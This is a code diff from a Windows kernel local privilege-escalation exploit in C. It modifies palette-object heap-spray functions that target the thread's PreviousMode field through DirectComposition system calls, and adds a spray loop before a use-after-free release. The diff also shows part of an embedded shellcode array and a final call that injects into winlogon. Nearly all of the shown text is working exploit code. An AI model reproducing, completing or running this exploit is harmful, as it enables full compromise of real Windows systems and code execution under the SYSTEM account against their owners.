@@ -242,35 +242,38 @@ BOOL InitEnvironment()
 
 DWORD64 where;
 
-HPALETTE createPaletteofSize1(int size) { 
-    int pal_cnt = (size + 0x8c - 0x90) / 4;  
-    int palsize = sizeof(LOGPALETTE) + (pal_cnt - 1) * sizeof(PALETTEENTRY); 
+HPALETTE createPaletteofSize1(int size) {
+    int pal_cnt = (size + 0x8c - 0x90) / 4;
+    int palsize = sizeof(LOGPALETTE) + (pal_cnt - 1) * sizeof(PALETTEENTRY);
     LOGPALETTE* lPalette = (LOGPALETTE*)malloc(palsize);
-    DWORD64* p = (DWORD64*)((DWORD64)lPalette + 4);   
-    memset(lPalette, 0xff, palsize); 
+    DWORD64* p = (DWORD64*)((DWORD64)lPalette + 4);
+    memset(lPalette, 0xff, palsize);
 
-    p[0] = (DWORD64)0x11223344;
-    p[3] = (DWORD64)0x04;   
-    p[9] = g_pExploitCtx->dwKernelEthreadAddr + g_pExploitCtx->previous_mode_offset - 9 - 8; 
-  
-    lPalette->palVersion = 0x300;
-    return CreatePalette(lPalette);
-}
-
-HPALETTE createPaletteofSize2(int size) { 
-    int pal_cnt = (size + 0x8c - 0x90) / 4;  
-    int palsize = sizeof(LOGPALETTE) + (pal_cnt - 1) * sizeof(PALETTEENTRY); 
-    LOGPALETTE* lPalette = (LOGPALETTE*)malloc(palsize);
-    DWORD64* p = (DWORD64*)((DWORD64)lPalette + 4);   
-    memset(lPalette, 0xff, palsize); 
-    p[0] = (DWORD64)0x11223344;
-    p[3] = (DWORD64)0x04;   
-    p[9] = where - 8 + 3;  
+    p[0] = (DWORD64)0xffffffff;
+    p[3] = (DWORD64)0x04;
+    p[9] = g_pExploitCtx->dwKernelEthreadAddr + g_pExploitCtx->previous_mode_offset - 9 - 8;
 
     lPalette->palNumEntries = pal_cnt;
     lPalette->palVersion = 0x300;
     return CreatePalette(lPalette);
 }
+
+HPALETTE createPaletteofSize2(int size) {
+    int pal_cnt = (size + 0x8c - 0x90) / 4;
+    int palsize = sizeof(LOGPALETTE) + (pal_cnt - 1) * sizeof(PALETTEENTRY);
+    LOGPALETTE* lPalette = (LOGPALETTE*)malloc(palsize);
+    DWORD64* p = (DWORD64*)((DWORD64)lPalette + 4);
+    memset(lPalette, 0xff, palsize);
+
+    p[0] = (DWORD64)0xffffffff;
+    p[3] = (DWORD64)0x04;
+    p[9] = where - 8 + 3;
+
+    lPalette->palNumEntries = pal_cnt;
+    lPalette->palVersion = 0x300;
+    return CreatePalette(lPalette);
+}
+
 
 unsigned char shellcode[] =
 "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51" \
@@ -599,6 +602,11 @@ int main(int argc, TCHAR* argv[]) {
     CopyMemory((PUCHAR)pMappedAddress + 0x10, szBuff, 0xc);
     ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10 + 0xc, &dwArg1, &dwArg2);
 
+    for (size_t i = 0; i < 0x5000; i++)
+    {
+        createPaletteofSize1(g_pExploitCtx->ObjectSize);
+    }
+
     *(DWORD*)pMappedAddress = nCmdReleaseResource;
     *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)Tracker1;
     *(DWORD*)((PUCHAR)pMappedAddress + 8) = 8;
@@ -606,8 +614,9 @@ int main(int argc, TCHAR* argv[]) {
 
     for (size_t i = 0; i < 0x5000; i++)
     {
-        createPaletteofSize1(g_pExploitCtx->ObjectSize);
+        createPaletteofSize2(g_pExploitCtx->ObjectSize);
     }
+
     NtDCompositionCommitChannel(hChannel, &dwArg1, &dwArg2, 0, NULL);
     InjectToWinlogon();
 }
